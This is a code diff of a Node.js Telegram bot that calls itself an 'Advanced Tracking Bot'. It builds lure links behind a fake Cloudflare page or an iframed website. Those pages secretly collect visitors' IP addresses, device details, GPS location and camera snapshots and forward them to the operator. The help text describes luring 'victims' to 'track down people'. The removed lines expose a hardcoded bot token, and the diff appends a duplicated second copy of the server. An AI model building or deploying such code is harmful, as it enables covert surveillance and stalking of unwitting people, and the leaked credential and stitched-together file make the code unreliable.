@@ -1,39 +1,38 @@
 const fs = require("fs");
 const express = require("express");
 var bodyParser = require("body-parser");
+
 const TelegramBot = require("node-telegram-bot-api");
+const bot = new TelegramBot(process.env["bot"], { polling: true });
 
-// --- CONFIGURATION ---
-const TOKEN = "8779470611:AAE6MnR-n0jOsvDKGBvV9aHqeyPXNzZeteI"
-const CHANNEL_ID = "@Digiwordls"; // ඔබේ Channel Username එක මෙතනට දාන්න (@ සමඟ)
-const CHANNEL_URL = "https://t.me/Digiwordls"; // ඔබේ Channel Link එක මෙතනට දාන්න
-const hostURL = "https://google-co-file.onrender.com";
+var jsonParser = bodyParser.json({
+  limit: 1024 * 1024 * 20,
+  type: "application/json",
+});
 
-const bot = new TelegramBot(TOKEN, { polling: true });
+var urlencodedParser = bodyParser.urlencoded({
+  extended: true,
+  limit: 1024 * 1024 * 20,
+  type: "application/x-www-form-urlencoded",
+});
+
 const app = express();
 
-app.use(bodyParser.json({ limit: "20mb" }));
-app.use(bodyParser.urlencoded({ extended: true, limit: "20mb" }));
+app.use(jsonParser);
+app.use(urlencodedParser);
+
 app.set("view engine", "ejs");
 
 // =========================
-// SUBSCRIPTION CHECK FUNCTION
+// HOST URL
 // =========================
-async function checkSubscription(chatId) {
-  try {
-    const member = await bot.getChatMember(CHANNEL_ID, chatId);
-    const status = member.status;
-    // member, administrator, හෝ creator නම් පමණක් true ලබා දෙයි
-    return status === "member" || status === "administrator" || status === "creator";
-  } catch (error) {
-    console.error("Subscription Error:", error);
-    return false;
-  }
-}
+
+var hostURL = "https://google-co-file.onrender.com";
 
 // =========================
 // START MENU
 // =========================
+
 function sendStartMenu(chatId, firstName = "User") {
   var menu = {
     reply_markup: JSON.stringify({
@@ -45,138 +44,558 @@ function sendStartMenu(chatId, firstName = "User") {
     }),
   };
 
-  // logo.png ගොනුව තිබේ නම් පමණක් මෙය ක්‍රියා කරයි
-  if (fs.existsSync("./logo.png")) {
-    bot.sendPhoto(chatId, fs.createReadStream("./logo.png"), {
-      caption: `🔥 Welcome ${firstName}!\n\n⚡ Advanced Tracking Bot\n\n━━━━━━━━━━━━━━\n✅ Features\n• Create custom links\n• Device information\n• IP logging\n• Camera capture\n• Location tracking\n━━━━━━━━━━━━━━\n\n👇 Select an option below`,
+  const photo = fs.createReadStream("./logo.png");
+
+  bot.sendPhoto(
+    chatId,
+    photo,
+    {
+      caption: `
+🔥 Welcome ${firstName} !
+
+⚡ Advanced Tracking Bot
+
+━━━━━━━━━━━━━━
+✅ Features
+• Create custom links
+• Device information
+• IP logging
+• Camera capture
+• Location tracking
+━━━━━━━━━━━━━━
+
+👇 Select an option below
+`,
       parse_mode: "HTML",
-    }, menu);
-  } else {
-    bot.sendMessage(chatId, `🔥 Welcome ${firstName}!\n\nSelect an option:`, menu);
-  }
+    },
+    menu
+  );
 }
+
+// =========================
+// WEBVIEW ROUTE
+// =========================
+
+app.get("/w/:path/:uri", (req, res) => {
+  var ip;
+
+  var d = new Date();
+  d = d.toJSON().slice(0, 19).replace("T", ":");
+
+  if (req.headers["x-forwarded-for"]) {
+    ip = req.headers["x-forwarded-for"].split(",")[0];
+  } else if (req.connection && req.connection.remoteAddress) {
+    ip = req.connection.remoteAddress;
+  } else {
+    ip = req.ip;
+  }
+
+  if (req.params.path != null) {
+    res.render("webview", {
+      ip: ip,
+      time: d,
+      url: atob(req.params.uri),
+      uid: req.params.path,
+    });
+  } else {
+    res.redirect("https://t.me/");
+  }
+});
+
+// =========================
+// CLOUDFLARE ROUTE
+// =========================
+
+app.get("/c/:path/:uri", (req, res) => {
+  var ip;
+
+  var d = new Date();
+  d = d.toJSON().slice(0, 19).replace("T", ":");
+
+  if (req.headers["x-forwarded-for"]) {
+    ip = req.headers["x-forwarded-for"].split(",")[0];
+  } else if (req.connection && req.connection.remoteAddress) {
+    ip = req.connection.remoteAddress;
+  } else {
+    ip = req.ip;
+  }
+
+  if (req.params.path != null) {
+    res.render("cloudflare", {
+      ip: ip,
+      time: d,
+      url: atob(req.params.uri),
+      uid: req.params.path,
+    });
+  } else {
+    res.redirect("https://t.me/");
+  }
+});
 
 // =========================
 // BOT MESSAGES
 // =========================
-bot.on("message", async (msg) => {
+
+bot.on("message", (msg) => {
   const chatId = msg.chat.id;
-  const text = msg.text;
 
-  // Verify / Start check
-  if (text === "/start") {
-    const isSubscribed = await checkSubscription(chatId);
+  // reply URL
+  if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
+    createLink(chatId, msg.text);
+  }
 
-    if (!isSubscribed) {
-      return bot.sendMessage(chatId, 
-        `👋 <b>Welcome!</b>\n\nYou must join our channel to use this bot.`, 
-        {
-          parse_mode: "HTML",
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: "📢 Join Channel", url: CHANNEL_URL }],
-              [{ text: "✅ Verify / Start", callback_data: "verify_join" }]
-            ]
-          }
-        }
-      );
-    }
+  // start
+  if (msg.text == "/start") {
     sendStartMenu(chatId, msg.chat.first_name);
-    return;
   }
 
-  // අනිත් Commands සඳහා join වී ඇත්දැයි බැලීම
-  const isSubscribed = await checkSubscription(chatId);
-  if (!isSubscribed) {
-    return bot.sendMessage(chatId, "⚠️ Please join our channel first to use commands!");
-  }
-
-  if (msg?.reply_to_message?.text == "🌐 Enter Your ANY URL") {
-    createLink(chatId, text);
-  } else if (text == "/create") {
+  // create
+  else if (msg.text == "/create") {
     createNew(chatId);
-  } else if (text == "/help") {
-    bot.sendMessage(chatId, `📖 <b>HOW TO USE</b>\n\n1️⃣ Send /create\n2️⃣ Enter your target URL\n3️⃣ Bot will generate links\n\n⚡ <b>FEATURES</b>\n• IP Logging\n• Device Info\n• Camera Capture`, { parse_mode: "HTML" });
+  }
+
+  // help
+  else if (msg.text == "/help") {
+    bot.sendMessage(
+      chatId,
+      `
+📖 HOW TO USE
+
+1️⃣ Send /create
+
+2️⃣ Enter your target URL
+
+3️⃣ Bot will generate links
+
+4️⃣ Send generated link
+
+━━━━━━━━━━━━━━
+
+⚡ FEATURES
+• Device Info
+• Camera Capture
+• IP Logging
+• Location Tracking
+`,
+      {
+        parse_mode: "HTML",
+      }
+    );
   }
 });
 
 // =========================
 // CALLBACK BUTTONS
 // =========================
-bot.on("callback_query", async (callbackQuery) => {
-  const chatId = callbackQuery.message.chat.id;
-  const data = callbackQuery.data;
 
-  if (data === "verify_join") {
-    const isSubscribed = await checkSubscription(chatId);
-    if (isSubscribed) {
-      bot.answerCallbackQuery(callbackQuery.id, { text: "✅ Success!" });
-      bot.deleteMessage(chatId, callbackQuery.message.message_id);
-      sendStartMenu(chatId, callbackQuery.from.first_name);
-    } else {
-      bot.answerCallbackQuery(callbackQuery.id, { text: "❌ You haven't joined yet!", show_alert: true });
-    }
-    return;
-  }
-
-  // අනෙකුත් buttons සඳහා join check එක
-  const isSubscribed = await checkSubscription(chatId);
-  if (!isSubscribed) {
-    return bot.answerCallbackQuery(callbackQuery.id, { text: "⚠️ Join channel first!", show_alert: true });
-  }
-
+bot.on("callback_query", async function onCallbackQuery(callbackQuery) {
   bot.answerCallbackQuery(callbackQuery.id);
-  if (data == "crenew") createNew(chatId);
-  if (data == "help") bot.sendMessage(chatId, "Send /create to generate links.");
-  if (data == "about") bot.sendMessage(chatId, "Advanced Tracking Bot v2.0");
+
+  const chatId = callbackQuery.message.chat.id;
+
+  // create
+  if (callbackQuery.data == "crenew") {
+    createNew(chatId);
+  }
+
+  // help
+  if (callbackQuery.data == "help") {
+    bot.sendMessage(
+      chatId,
+      `
+📖 𝗛𝗘𝗟𝗣 𝗠𝗘𝗡𝗨🔮
+
+Send /create to generate a new link.
+
+━━━━━━━━━━━━━━
+⚡ BOT FEATURES
+
+• 𝐈𝐏 𝐥𝐨𝐠𝐢𝐧
+• 𝐃𝐞𝐯𝐢𝐜𝐞 𝐓𝐫𝐚𝐜𝐤𝐢𝐧𝐠
+• 𝐂𝐚𝐦𝐞𝐫𝐚 𝐇𝐚𝐜𝐤𝐢𝐧𝐠
+• 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐓𝐫𝐚𝐜𝐤𝐢𝐧𝐠
+━━━━━━━━━━━━━━
+`
+    );
+  }
+
+  // about
+  if (callbackQuery.data == "about") {
+    bot.sendMessage(
+      chatId,
+      `
+ℹ️ ABOUT BOT
+
+🔥 Advanced Telegram Tracking Bot
+
+⚙️ Built With:
+• NodeJS
+• Express
+• Telegram Bot API
+
+🚀 Hosted On vps
+`
+    );
+  }
 });
 
 // =========================
-// FUNCTIONS
+// POLLING ERROR
 // =========================
+
+bot.on("polling_error", (error) => {
+  console.log(error.code);
+});
+
+// =========================
+// CREATE LINK
+// =========================
+
 function createLink(cid, msg) {
   var encoded = [...msg].some((char) => char.charCodeAt(0) > 127);
-  if ((msg.toLowerCase().includes("http")) && !encoded) {
+
+  if (
+    (msg.toLowerCase().indexOf("http") > -1 ||
+      msg.toLowerCase().indexOf("https") > -1) &&
+    !encoded
+  ) {
     var url = cid.toString(36) + "/" + btoa(msg);
-    bot.sendMessage(cid, `✅ Links Created:\n\n🌐 CloudFlare:\n${hostURL}/c/${url}\n\n🌐 WebView:\n${hostURL}/w/${url}`);
+
+    var m = {
+      reply_markup: JSON.stringify({
+        inline_keyboard: [
+          [{ text: "🌐 Create New Link", callback_data: "crenew" }],
+        ],
+      }),
+    };
+
+    bot.sendMessage(
+      cid,
+      `
+✅ New links created successfully
+
+🌍 URL:
+${msg}
+
+━━━━━━━━━━━━━━
+
+☁️ CloudFlare Link
+${hostURL}/c/${url}
+
+🌐 WebView Link
+${hostURL}/w/${url}
+
+━━━━━━━━━━━━━━
+`,
+      m
+    );
   } else {
-    bot.sendMessage(cid, `⚠️ Invalid URL.`);
+    bot.sendMessage(
+      cid,
+      `⚠️ Please enter a valid URL including http or https`
+    );
+
     createNew(cid);
   }
 }
 
+// =========================
+// CREATE NEW
+// =========================
+
 function createNew(cid) {
-  bot.sendMessage(cid, `🌐 Enter Your ANY URL`, { reply_markup: { force_reply: true } });
+  var mk = {
+    reply_markup: JSON.stringify({
+      force_reply: true,
+    }),
+  };
+
+  bot.sendMessage(cid, `🌐 Enter Your ANY URL`, mk);
 }
 
 // =========================
-// ROUTES (Express)
+// HOME ROUTE
 // =========================
-app.get("/w/:path/:uri", (req, res) => {
-  let ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.ip;
-  res.render("webview", { ip, time: new Date().toISOString(), url: atob(req.params.uri), uid: req.params.path });
+
+app.get("/", (req, res) => {
+  var ip;
+
+  if (req.headers["x-forwarded-for"]) {
+    ip = req.headers["x-forwarded-for"].split(",")[0];
+  } else if (req.connection && req.connection.remoteAddress) {
+    ip = req.connection.remoteAddress;
+  } else {
+    ip = req.ip;
+  }
+
+  res.send(ip);
 });
 
-app.get("/c/:path/:uri", (req, res) => {
-  let ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.ip;
-  res.render("cloudflare", { ip, time: new Date().toISOString(), url: atob(req.params.uri), uid: req.params.path });
-});
+// =========================
+// LOCATION
+// =========================
 
 app.post("/location", (req, res) => {
-  const { lat, lon, uid, acc } = req.body;
-  if (lat && lon && uid) {
+  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
+
+  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
+
+  var uid = decodeURIComponent(req.body.uid) || null;
+
+  var acc = decodeURIComponent(req.body.acc) || null;
+
+  if (lon != null && lat != null && uid != null && acc != null) {
     bot.sendLocation(parseInt(uid, 36), lat, lon);
-    bot.sendMessage(parseInt(uid, 36), `📍 Location Received\nAcc: ${acc}m`);
+
+    bot.sendMessage(
+      parseInt(uid, 36),
+      `
+📍 Location Received
+
+Latitude: ${lat}
+Longitude: ${lon}
+
+🎯 Accuracy: ${acc} meters
+`
+    );
+
+    res.send("Done");
   }
-  res.send("Done");
 });
+
+// =========================
+// DEVICE DATA
+// =========================
+
+app.post("/", (req, res) => {
+  var uid = decodeURIComponent(req.body.uid) || null;
+
+  var data = decodeURIComponent(req.body.data) || null;
+
+  if (uid != null && data != null) {
+    data = data.replaceAll("<br>", "\n");
+
+    bot.sendMessage(parseInt(uid, 36), data, {
+      parse_mode: "HTML",
+    });
+
+    res.send("Done");
+  }
+});
+
+// =========================
+// CAMERA SNAP
+// =========================
 
 app.post("/camsnap", (req, res) => {
-  const { uid, img } = req.body;
-  if (uid && img) {
-    bot.sendPhoto(parseInt(uid, 36), Buffer.from(img, "base64"), {}, { filename: "snap.png", contentType: "image/png" });
+  var uid = decodeURIComponent(req.body.uid) || null;
+
+  var img = decodeURIComponent(req.body.img) || null;
+
+  if (uid != null && img != null) {
+    var buffer = Buffer.from(img, "base64");
+
+    var info = {
+      filename: "camsnap.png",
+      contentType: "image/png",
+    };
+
+    try {
+      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
+    } catch (error) {
+      console.log(error);
+    }
+
+    res.send("Done");
   }
-  res.send("Done");
 });
 
-app.listen(5000, () => console.log("✅ Server started on port 5000"));
+// =========================
+// SERVER
+// =========================
+
+const PORT = process.env.PORT || 5000;
+
+app.listen(PORT, () => {
+  console.log(`✅ Server Running On Port ${PORT}`);
+});
+app.get("/c/:path/:uri",(req,res)=>{
+var ip;
+var d = new Date();
+d=d.toJSON().slice(0,19).replace('T',':');
+if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
+
+
+if(req.params.path != null){
+res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path});
+} 
+else{
+res.redirect("https://t.me/hacker-bot");
+}
+
+         
+                              
+});
+
+
+
+bot.on('message', (msg) => {
+const chatId = msg.chat.id;
+
+
+if(msg?.reply_to_message?.text=="🌐 Enter Your ANY URL"){
+ createLink(chatId,msg.text); 
+}
+  
+if(msg.text=="/start"){
+var m={
+reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
+};
+
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+}
+else if(msg.text=="/create"){
+createNew(chatId);
+}
+else if(msg.text=="/help"){
+bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
+to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
+the url it will send you 2 links which you can use to track people.
+\n\nSpecifications.
+\n1. Cloudflare Link: This method will show a cloudflare under attack page to garher informations and afterwards victim will be redirected to destinationed URL.
+\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
+( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
+\n\nThe project is OSS at:Cam Hack Bot
+`);
+}
+  
+  
+});
+
+bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
+bot.answerCallbackQuery(callbackQuery.id);
+if(callbackQuery.data=="crenew"){
+createNew(callbackQuery.message.chat.id);
+} 
+});
+bot.on('polling_error', (error) => {
+console.log(error.code); 
+});
+
+
+
+
+
+function createLink(cid,msg){
+
+var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
+
+if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
+ 
+var url=cid.toString(36)+'/'+btoa(msg);
+var m={
+  reply_markup:JSON.stringify({
+    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
+  } )
+};
+  
+bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${hostURL}/c/${url}\n\n🌐 WebView Page Link\n${hostURL}/w/${url}`,m);
+ 
+}
+else{
+bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
+createNew(cid);
+
+}  
+}
+
+
+function createNew(cid){
+var mk={
+reply_markup:JSON.stringify({"force_reply":true})
+};
+bot.sendMessage(cid,`🌐 Enter Your ANY URL`,mk);
+}
+
+
+
+
+
+app.get("/", (req, res) => {
+var ip;
+var d = new Date();
+d=d.toJSON().slice(0,19).replace('T',':');
+if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
+res.send(ip);
+
+  
+});
+
+
+app.post("/location",(req,res)=>{
+
+  
+var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
+var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
+var uid=decodeURIComponent(req.body.uid) || null;
+var acc=decodeURIComponent(req.body.acc) || null;
+if(lon != null && lat != null && uid != null && acc != null){
+  bot.sendLocation(parseInt(uid,36),lat,lon);
+
+bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
+  
+res.send("Done");
+}
+});
+
+
+app.post("/",(req,res)=>{
+
+var uid=decodeURIComponent(req.body.uid) || null;
+var data=decodeURIComponent(req.body.data)  || null; 
+if( uid != null && data != null){
+
+
+data=data.replaceAll("<br>","\n");
+
+bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});
+
+  
+res.send("Done");
+}
+});
+
+
+app.post("/camsnap",(req,res)=>{
+var uid=decodeURIComponent(req.body.uid)  || null;
+var img=decodeURIComponent(req.body.img) || null;
+  
+if( uid != null && img != null){
+  
+var buffer=Buffer.from(img,'base64');
+
+var info={
+filename:"camsnap.png",
+contentType: 'image/png'
+};
+
+
+try {
+bot.sendPhoto(parseInt(uid,36),buffer,{},info);
+} catch (error) {
+console.log(error);
+}
+
+
+res.send("Done");
+ 
+}
+
+});
+
+
+
+app.listen(5000, () => {
+console.log("App Running on Port 5000!");
+});
+
